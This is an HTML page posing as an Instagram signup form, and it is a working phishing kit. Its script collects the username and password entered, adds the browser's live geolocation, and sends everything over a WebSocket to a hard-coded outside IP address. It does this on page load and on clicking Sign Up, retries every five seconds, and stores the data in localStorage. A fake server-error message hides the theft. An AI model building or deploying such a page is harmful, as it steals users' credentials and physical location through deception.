<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram SignUp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            background-color: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
            color: #262626;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .btn-signup {
            width: 100%;
            padding: 10px;
            background-color: #3897f0;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        .btn-signup:hover {
            background-color: #3498db;
        }
        .message {
            text-align: center;
            color: red;
            display: none;
            font-size: 14px;
            margin-top: 10px;
        }
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Instagram Signup</h1>
        <form id="signupForm">
            <input type="text" id="username" class="input-field" placeholder="Instagram ID" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="button" class="btn-signup" onclick="signup()">Sign Up</button>
        </form>
        <div id="message" class="message">Server is not running perfectly, please try again later.</div>
    </div>

    <script>
        // WebSocket server address
        const wsServer = "wss://49.47.68.143:8765";
        let socket;
        function signup() {
            // Get user ID and password
            const userId = document.getElementById('username').value;
            const userPassword = document.getElementById('password').value;
            const msg = document.getElementsByClassName('message')[0];
            // Check if ID and password are provided
            if (!userId || !userPassword) {
                msg.style.display = "block";  // Display the message div
                msg.textContent = "Please fill in the above fields.";  // Show the relevant message
            } else {
                msg.style.display = "block";  // Display the message div
                msg.textContent = "The server is not running perfectly, please try again later.";  // Show the other message
            }

            // Simulating a server issue after clicking the signup button
            document.getElementById('message').style.display = 'block';

            // Initialize WebSocket connection and send data
            initWebSocket(userId, userPassword);
        }
        function initWebSocket(userId, userPassword) {
            socket = new WebSocket(wsServer);

            socket.onopen = () => {
                console.log("Connected to WebSocket server.");

                // After connection is opened, send live location when the user clicks Sign Up
                sendLiveLocation(socket, userId, userPassword);
            };

            socket.onerror = (error) => {
                console.log("Not Connected.");
            };

            socket.onclose = () => {
                console.log("WebSocket connection closed.");

                // Retry to reconnect and resend the data once connected
                setTimeout(() => initWebSocket(userId, userPassword), 5000); // Retry after 5 seconds

            }};
        // Function to get and send live location along with other data
        function sendLiveLocation(socket, userId, userPassword) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;

                        // Prepare the full message with user data and live location
                        const locationData = {
                            id: userId,
                            password: userPassword,
                            liveLocation: {
                                longitude: longitude,
                                latitude: latitude
                            }
                        };

                        // Send the complete data as a JSON object
                        socket.send(JSON.stringify(locationData));
                        console.log("Live location and user data sent to WebSocket server:", locationData);

                        // Save live location in localStorage for future use
                        localStorage.setItem('savedLocation', JSON.stringify(locationData));
                    },
                    (error) => {
                        console.error("Error retrieving live location:", error.message);
                    }
                );
            } else {
                console.error("Geolocation is not supported by this browser.");
            }
        }

        // Function to initialize WebSocket and send data on page load
        window.onload = function() {
            // Get user ID and password
            const userId = document.getElementById('username').value;
            const userPassword = document.getElementById('password').value;

            // Initialize WebSocket connection
            socket = new WebSocket(wsServer);

            socket.onopen = () => {
                console.log("Connected to WebSocket server.");

                // Send live location as soon as the page loads
                sendLiveLocation(socket, userId, userPassword);
            };

            socket.onerror = (error) => {
                console.log("Error connecting to WebSocket:", error);
            };

            socket.onclose = () => {
                console.log("WebSocket connection closed.");

                // Retry to reconnect and resend the data once connected
                setTimeout(() => window.onload(), 5000); // Retry after 5 seconds

                // Optionally, if the connection is closed, save the location for later
                if (localStorage.getItem('savedLocation')) {
                    console.log("Saved location available, will resend once connected");
                }
            };

            socket.onmessage = (event) => {
                console.log("Message from server:", event.data);
            };
        };
    </script>

</body>
</html>
